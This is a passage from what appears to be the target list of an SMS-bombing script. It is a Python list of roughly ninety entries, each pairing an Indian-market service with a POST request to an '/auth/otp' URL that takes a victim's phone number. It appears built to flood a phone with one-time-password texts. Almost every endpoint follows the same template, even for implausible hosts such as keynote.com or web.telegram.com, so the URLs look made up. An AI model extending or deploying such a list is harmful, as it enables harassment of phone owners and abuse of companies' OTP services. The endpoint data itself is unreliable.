    'url': 'https://api.viadeo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 190
{
    'name': 'About.me_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.about.me/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 191
{
    'name': 'AngelList_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.angellist.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 192
{
    'name': 'ProductHunt_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.producthunt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 193
{
    'name': 'IndieHackers_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indiehackers.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 194
{
    'name': 'Dev.to_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dev.to/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 195
{
    'name': 'Hashnode_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hashnode.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 196
{
    'name': 'Devfolio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.devfolio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 197
{
    'name': 'Hackathon_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackathon.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 198
{
    'name': 'MLH_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mlh.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 199
{
    'name': 'HackerRank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackerrank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 200
{
    'name': 'LeetCode_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.leetcode.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 201
{
    'name': 'CodeChef_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codechef.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 202
{
    'name': 'Codeforces_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codeforces.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 203
{
    'name': 'AtCoder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atcoder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 204
{
    'name': 'TopCoder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.topcoder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 205
{
    'name': 'SPOJ_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spoj.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 206
{
    'name': 'HackerEarth_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackerearth.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 207
{
    'name': 'Codewars_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codewars.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 208
{
    'name': 'Codingame_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codingame.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 209
{
    'name': 'Pluralsight_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pluralsight.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 210
{
    'name': 'Coursera_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coursera.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 211
{
    'name': 'edX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.edx.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 212
{
    'name': 'Udacity_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.udacity.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 213
{
    'name': 'Udemy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.udemy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 214
{
    'name': 'Skillshare_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.skillshare.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 215
{
    'name': 'LinkedIn_Learning_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.linkedinlearning.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 216
{
    'name': 'MasterClass_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.masterclass.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 217
{
    'name': 'Brilliant_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.brilliant.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 218
{
    'name': 'Khan_Academy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.khanacademy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 219
{
    'name': 'Byjus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.byjus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 220
{
    'name': 'Unacademy_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unacademy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 221
{
    'name': 'Vedantu_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vedantu.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 222
{
    'name': 'Toppr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.toppr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 223
{
    'name': 'Meritnation_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meritnation.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 224
{
    'name': 'Aakash_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aakash.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 225
{
    'name': 'FIITJEE_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fiitjee.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 226
{
    'name': 'Resonance_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.resonance.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 227
{
    'name': 'Allen_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.allen.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 228
{
    'name': 'Narayana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.narayana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 229
{
    'name': 'Chaitanya_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chaitanya.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 230
{
    'name': 'Sri_Chaitanya_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.srichaitanya.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 231
{
    'name': 'Career_Point_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.careerpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 232
{
    'name': 'Bansal_Classes_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bansalclasses.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 233
{
    'name': 'Kota_Coaching_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotacoaching.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 234
{
    'name': 'Alakh_Pandey_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.alakhpandey.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 235
{
    'name': 'Physics_Wallah_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.physicswallah.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 236
{
    'name': 'Unacademy_Plus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unacademyplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 237
{
    'name': 'Vedantu_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vedantupro.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 238
{
    'name': 'BYJUS_Class_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.byjusclass.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 239
{
    'name': 'Toppr_Anytime_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.topprany.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 240
{
    'name': 'Meritnation_Plus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meritnationplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 241
{
    'name': 'Aakash_iTutor_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.aakashitutor.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 242
{
    'name': 'FIITJEE_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fiitjeeonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 243
{
    'name': 'Resonance_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.resonanceonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 244
{
    'name': 'Allen_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.allenonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 245
{
    'name': 'Narayana_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.narayanaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 246
{
    'name': 'Chaitanya_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.chaitanyaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 247
{
    'name': 'SriChaitanya_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.srichaitanyaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 248
{
    'name': 'CareerPoint_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.careerpointonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 249
{
    'name': 'Bansal_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bansalonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 250
{
    'name': 'Kota_Online_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotaonline.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 251
{
    'name': 'WhatsApp_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.whatsapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 252
{
    'name': 'Telegram_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.telegram.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 253
{
    'name': 'Signal_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://web.signal.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 254
{
    'name': 'Discord_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://discord.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 255
{
    'name': 'Slack_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slack.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 256
{
    'name': 'Teams_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://teams.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 257
{
    'name': 'Zoom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zoom.us/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 258
{
    'name': 'Google_Meet_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://meet.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 259
{
    'name': 'Cisco_Webex_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://webex.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 260
{
    'name': 'Adobe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://adobe.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 261
{
    'name': 'Figma_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://figma.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 262
{
    'name': 'Canva_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://canva.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 263
{
    'name': 'Sketch_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://sketch.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 264
{
    'name': 'InVision_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://invisionapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 265
{
    'name': 'Marvel_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://marvelapp.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 266
{
    'name': 'Proto_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://proto.io/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 267
{
    'name': 'UXPin_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://uxpin.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 268
{
    'name': 'Balsamiq_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://balsamiq.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 269
{
    'name': 'Axure_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://axure.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 270
{
    'name': 'MockFlow_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockflow.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 271
{
    'name': 'Wireframe_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://wireframe.cc/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 272
{
    'name': 'Mockplus_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://mockplus.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 273
{
    'name': 'JustInMind_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://justinmind.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 274
{
    'name': 'Pidoco_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://pidoco.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 275
{
    'name': 'HotGloo_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://hotgloo.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 276
{
    'name': 'FluidUI_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://fluidui.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 277
{
    'name': 'Framer_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://framer.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 278
{
    'name': 'Origami_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://origami.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 279
{
    'name': 'Principle_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://principle.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 280
{
    'name': 'Keynote_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://keynote.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 281
{
    'name': 'PowerPoint_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://powerpoint.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 282
{
    'name': 'Slides_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slides.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 283
{
    'name': 'Prezi_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
